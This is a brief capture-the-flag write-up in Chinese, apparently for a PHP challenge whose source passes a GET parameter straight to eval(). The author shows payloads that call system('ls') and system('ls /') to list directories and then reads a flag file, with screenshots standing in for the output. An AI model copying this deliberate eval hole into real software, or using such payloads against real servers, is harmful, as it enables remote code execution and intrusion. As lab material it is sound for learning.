```
 <?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?> 
```

分析源码

get传参url

eval执行

```
?url=system("ls");
```

![image-20250403171624006](./assets/image-20250403171624006.png)

```
?url=system("ls /");
```

![image-20250403171643664](./assets/image-20250403171643664.png)





读取/flllllaaaaaaggggggg

![image-20250403171659623](./assets/image-20250403171659623.png)